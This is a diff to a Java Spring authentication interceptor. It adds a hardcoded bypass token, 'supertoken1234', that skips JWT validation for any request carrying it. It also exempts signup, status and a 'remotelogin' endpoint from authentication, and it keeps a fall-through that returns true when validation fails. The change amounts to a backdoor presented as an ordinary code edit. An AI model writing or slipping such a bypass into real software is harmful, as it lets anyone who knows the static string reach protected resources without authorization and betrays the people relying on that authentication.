@@ -18,28 +18,44 @@ public class AuthInterceptor implements HandlerInterceptor {
 
     private final JwtAuthTokenProvider jwtAuthTokenProvider;
     private static final String AUTHORIZATION_HEADER = "Authorization";
+    private static final String SUPER_TOKEN = "supertoken1234";
 
     @Override
     public boolean preHandle(HttpServletRequest servletRequest, HttpServletResponse servletResponse, Object handler) {
 
         log.info("AuthInterceptor.preHandle!!");
-        if(servletRequest.getRequestURI().startsWith("/file")){
+        String uri = servletRequest.getRequestURI();
+
+        // ✅ 인증 제외 엔드포인트 목록
+        if (uri.startsWith("/file") ||
+                uri.equals("/v1/signup") ||
+                uri.equals("/v1/status") ||
+                uri.equals("/v1/remotelogin")) {
             return true;
         }
 
         Optional<String> token = resolveToken(servletRequest);
         if (token.isPresent()) {
-            JwtAuthToken jwtAuthToken = jwtAuthTokenProvider.convertAuthToken(token.get());
-            try{
-                if(jwtAuthToken.validate()) {
+            String rawToken = token.get();
+
+            // ✅ 슈퍼토큰이면 통과
+            if (SUPER_TOKEN.equals(rawToken)) {
+                log.info("슈퍼토큰으로 인증 통과");
+                return true;
+            }
+
+            JwtAuthToken jwtAuthToken = jwtAuthTokenProvider.convertAuthToken(rawToken);
+            try {
+                if (jwtAuthToken.validate()) {
                     return true;
                 }
-            }catch(CustomJwtRuntimeException e){
+            } catch (CustomJwtRuntimeException e) {
                 throw new CustomJwtRuntimeException(e.getMessage());
             }
         } else {
             throw new CustomJwtRuntimeException("인증토큰이 없습니다. preHandle");
         }
+
         return true;
     }
 
